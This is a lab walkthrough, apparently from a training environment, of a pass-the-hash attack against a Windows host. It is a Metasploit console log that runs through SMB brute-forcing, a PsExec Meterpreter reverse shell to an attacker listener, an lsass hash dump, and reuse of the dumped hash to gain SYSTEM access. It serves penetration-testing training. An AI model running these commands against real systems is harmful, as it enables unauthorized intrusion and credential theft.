- Pass the hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear text passwords and utilizing them to authenticate with the target legitimately.
- We can use the PsExec module to legitimately authenticate with the target system via SMB.
- This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation.


```
root@attackdefense:~# cat /root/Desktop/target 
Target IP Address : 10.5.29.2
root@attackdefense:~# service postgresql start && msfconsole
Starting PostgreSQL 12 database server: main.
                                                  
# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2052 exploits - 1108 auxiliary - 344 post       ]
+ -- --=[ 566 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: View a module's description using info, or the enhanced version in your browser with info -d

msf5 > db_statuus
[-] Unknown command: db_statuus.
msf5 > db_status
[*] Connected to msf. Connection type: postgresql.
msf5 > workspace -a passhash
[*] Added workspace: passhash
[*] Workspace: passhash
msf5 > setg rhosts 10.5.29.2
rhosts => 10.5.29.2
msf5 > db_nmap -sV 10.5.29.2
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2023-08-07 14:33 IST
[*] Nmap: Nmap scan report for 10.5.29.2
[*] Nmap: Host is up (0.0017s latency).
[*] Nmap: Not shown: 996 closed ports
[*] Nmap: PORT     STATE SERVICE       VERSION
[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp  open  microsoft-ds?
[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 12.99 seconds
msf5 > search smb_login

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_login                   normal  No     SMB Login Check Scanner


msf5 > db_nmap -p445 --script smb-protocols 10.5.29.2
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2023-08-07 14:37 IST
[*] Nmap: Nmap scan report for 10.5.29.2
[*] Nmap: Host is up (0.0019s latency).
[*] Nmap: PORT    STATE SERVICE
[*] Nmap: 445/tcp open  microsoft-ds
[*] Nmap: Host script results:
[*] Nmap: | smb-protocols:
[*] Nmap: |   dialects:
[*] Nmap: |     2.02
[*] Nmap: |     2.10
[*] Nmap: |     3.00
[*] Nmap: |     3.02
[*] Nmap: |_    3.11
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 6.38 seconds
msf5 > use auxiliary/scanner/smb/smb_login
msf5 auxiliary(scanner/smb/smb_login) > options

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS             10.5.29.2        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts

msf5 auxiliary(scanner/smb/smb_login) > set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
user_file => /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf5 auxiliary(scanner/smb/smb_login) > set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
pass_file => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5 auxiliary(scanner/smb/smb_login) > run

[*] 10.5.29.2:445         - 10.5.29.2:445 - Starting SMB login bruteforce
[-] 10.5.29.2:445         - 10.5.29.2:445 - Failed: '.\sysadmin:admin',
[-] 10.5.29.2:445         - 10.5.29.2:445 - Failed: '.\sysadmin:123456',
[-] 10.5.29.2:445         - 10.5.29.2:445 - Failed: '.\sysadmin:12345',
[-] 10.5.29.2:445         - 10.5.29.2:445 - Failed: '.\sysadmin:123456789',
[-] 10.5.29.2:445         - 10.5.29.2:445 - Failed: '.\sysadmin:password',
[-] 10.5.29.2:445         - 10.5.29.2:445 - Failed: '.\sysadmin:iloveyou',
[-] 10.5.29.2:445         - 10.5.29.2:445 - Failed: '.\sysadmin:princess',
[-] 10.5.29.2:445         - 10.5.29.2:445 - Failed: '.\sysadmin:1234567',
[-] 10.5.29.2:445         - 10.5.29.2:445 - Failed: '.\sysadmin:12345678',
[-] 10.5.29.2:445         - 10.5.29.2:445 - Failed: '.\sysadmin:abc123',
[-] 10.5.29.2:445         - 10.5.29.2:445 - Failed: '.\sysadmin:nicole',
[-] 10.5.29.2:445         - 10.5.29.2:445 - Failed: '.\sysadmin:daniel',
^C[*] 10.5.29.2:445         - Caught interrupt from the console...
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smb/smb_login) > set verbose false 
verbose => false
msf5 auxiliary(scanner/smb/smb_login) > run

[+] 10.5.29.2:445         - 10.5.29.2:445 - Success: '.\sysadmin:samantha'
[+] 10.5.29.2:445         - 10.5.29.2:445 - Success: '.\demo:victoria'
[+] 10.5.29.2:445         - 10.5.29.2:445 - Success: '.\auditor:elizabeth'
[+] 10.5.29.2:445         - 10.5.29.2:445 - Success: '.\administrator:qwertyuiop' Administrator
[*] 10.5.29.2:445         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smb/smb_login) > search psexec

Matching Modules
================

   #   Name                                         Disclosure Date  Rank       Check  Description
   -   ----                                         ---------------  ----       -----  -----------
   0   auxiliary/admin/smb/ms17_010_command         2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1   auxiliary/admin/smb/psexec_command                            normal     No     Microsoft Windows Authenticated Administration Utility
   2   auxiliary/admin/smb/psexec_ntdsgrab                           normal     No     PsExec NTDS.dit And SYSTEM Hive Download Utility
   3   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal     No     DCOM Exec
   4   auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal     No     WMI Exec
   5   auxiliary/scanner/smb/psexec_loggedin_users                   normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
   6   encoder/x86/service                                           manual     No     Register Service
   7   exploit/windows/local/current_user_psexec    1999-01-01       excellent  No     PsExec via Current User Token
   8   exploit/windows/local/wmi                    1999-01-01       excellent  No     Windows Management Instrumentation (WMI) Remote Command Execution
   9   exploit/windows/smb/ms17_010_psexec          2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   10  exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
   11  exploit/windows/smb/psexec_psh               1999-01-01       manual     No     Microsoft Windows Authenticated Powershell Command Execution
   12  exploit/windows/smb/webexec                  2018-10-24       manual     No     WebExec Authenticated User Code Execution


Interact with a module by name or index, for example use 12 or use exploit/windows/smb/webexec

msf5 auxiliary(scanner/smb/smb_login) > Interrupt: use the 'exit' command to quit
msf5 auxiliary(scanner/smb/smb_login) > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                10.5.29.2        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.12.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/smb/psexec) > set smbuser administrator
smbuser => administrator
msf5 exploit(windows/smb/psexec) > set smbpass qwertyuiop
smbpass => qwertyuiop
msf5 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.12.3:4444 
[*] 10.5.29.2:445 - Connecting to the server...
[*] 10.5.29.2:445 - Authenticating to 10.5.29.2:445 as user 'administrator'...
[*] 10.5.29.2:445 - Selecting PowerShell target
[*] 10.5.29.2:445 - Executing the payload...
[+] 10.5.29.2:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176195 bytes) to 10.5.29.2
[*] Meterpreter session 1 opened (10.10.12.3:4444 -> 10.5.29.2:49780) at 2023-08-07 14:44:07 +0530

meterpreter > sysinfo
Computer        : EC2AMAZ-408S766
OS              : Windows 2016+ (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
meterpreter > pgrep lsass
692
meterpreter > migrate 692
[*] Migrating from 2168 to 692...
[*] Migration completed successfully.
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0d757ad173d2fc249ce19364fd64c8ec:::
auditor:1012:aad3b435b51404eeaad3b435b51404ee:b8f8e199032b942917462188805a5d5d:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
demo:1013:aad3b435b51404eeaad3b435b51404ee:4699b6979c6e1513ec8f54ba8dd219b2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sysadmin:1011:aad3b435b51404eeaad3b435b51404ee:e8a38f149bf33b7e1678cb0676dd9df5:::
meterpreter > bg
[*] Backgrounding session 1...
msf5 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                10.5.29.2        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass               qwertyuiop       no        The password for the specified username
   SMBUser               administrator    no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.12.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/smb/psexec) > set smbuser sysadmin
smbuser => sysadmin
msf5 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:e8a38f149bf33b7e1678cb0676dd9df5
smbpass => aad3b435b51404eeaad3b435b51404ee:e8a38f149bf33b7e1678cb0676dd9df5
msf5 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/psexec) > set lport 4433
lport => 4433
msf5 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.12.3:4433 
[*] 10.5.29.2:445 - Connecting to the server...
[*] 10.5.29.2:445 - Authenticating to 10.5.29.2:445 as user 'sysadmin'...
[-] 10.5.29.2:445 - Exploit failed [no-access]: RubySMB::Error::UnexpectedStatusCode STATUS_ACCESS_DENIED
[*] Exploit completed, but no session was created.
msf5 exploit(windows/smb/psexec) > set smbuser auditor
smbuser => auditor
msf5 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:b8f8e199032b942917462188805a5d5d
smbpass => aad3b435b51404eeaad3b435b51404ee:b8f8e199032b942917462188805a5d5d
msf5 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.12.3:4433 
[*] 10.5.29.2:445 - Connecting to the server...
[*] 10.5.29.2:445 - Authenticating to 10.5.29.2:445 as user 'auditor'...
[-] 10.5.29.2:445 - Exploit failed [no-access]: RubySMB::Error::UnexpectedStatusCode STATUS_ACCESS_DENIED
[*] Exploit completed, but no session was created.
msf5 exploit(windows/smb/psexec) > set smbuser administrator
smbuser => administrator
msf5 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:0d757ad173d2fc249ce19364fd64c8ec
smbpass => aad3b435b51404eeaad3b435b51404ee:0d757ad173d2fc249ce19364fd64c8ec
msf5 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.12.3:4433 
[*] 10.5.29.2:445 - Connecting to the server...
[*] 10.5.29.2:445 - Authenticating to 10.5.29.2:445 as user 'administrator'...
[*] 10.5.29.2:445 - Selecting PowerShell target
[*] 10.5.29.2:445 - Executing the payload...
[+] 10.5.29.2:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (201283 bytes) to 10.5.29.2
[*] Meterpreter session 2 opened (10.10.12.3:4433 -> 10.5.29.2:49791) at 2023-08-07 14:48:23 +0530

meterpreter > sysinfo
Computer        : EC2AMAZ-408S766
OS              : Windows 2016+ (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0d757ad173d2fc249ce19364fd64c8ec:::
auditor:1012:aad3b435b51404eeaad3b435b51404ee:b8f8e199032b942917462188805a5d5d:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
demo:1013:aad3b435b51404eeaad3b435b51404ee:4699b6979c6e1513ec8f54ba8dd219b2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sysadmin:1011:aad3b435b51404eeaad3b435b51404ee:e8a38f149bf33b7e1678cb0676dd9df5:::
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreatePermanentPrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeLockMemoryPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTcbPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > cd /
meterpreter > ls
Listing: C:\
============

Mode              Size           Type  Last modified               Name
----              ----           ----  -------------               ----
40777/rwxrwxrwx   0              dir   2016-07-16 18:53:21 +0530   $Recycle.Bin
100666/rw-rw-rw-  1              fil   2016-07-16 19:09:41 +0530   BOOTNXT
40777/rwxrwxrwx   8192           dir   2016-10-18 05:46:03 +0530   Boot
40777/rwxrwxrwx   0              dir   2016-10-18 07:29:39 +0530   Documents and Settings
40777/rwxrwxrwx   0              dir   2016-07-16 18:53:21 +0530   PerfLogs
40555/r-xr-xr-x   4096           dir   2016-07-16 11:34:24 +0530   Program Files
40777/rwxrwxrwx   4096           dir   2016-07-16 11:34:24 +0530   Program Files (x86)
40777/rwxrwxrwx   4096           dir   2016-07-16 18:53:21 +0530   ProgramData
40777/rwxrwxrwx   0              dir   2016-10-18 07:31:27 +0530   Recovery
40777/rwxrwxrwx   0              dir   2020-09-25 11:43:20 +0530   System Volume Information
40555/r-xr-xr-x   4096           dir   2016-07-16 11:34:24 +0530   Users
40777/rwxrwxrwx   28672          dir   2016-07-16 11:34:24 +0530   Windows
40777/rwxrwxrwx   0              dir   2020-09-25 12:11:47 +0530   admin
100444/r--r--r--  388690         fil   2016-07-16 19:09:41 +0530   bootmgr
100666/rw-rw-rw-  32             fil   2020-09-25 12:11:13 +0530   flag.txt
0214/-w---xr--    1736012185424  fif   56982-01-14 16:37:44 +0530  pagefile.sys
40777/rwxrwxrwx   0              dir   2020-09-25 12:12:16 +0530   public

meterpreter > cat flag.txt 
e0da81a9cd42b261bc9b90d15f780433
meterpreter >
```

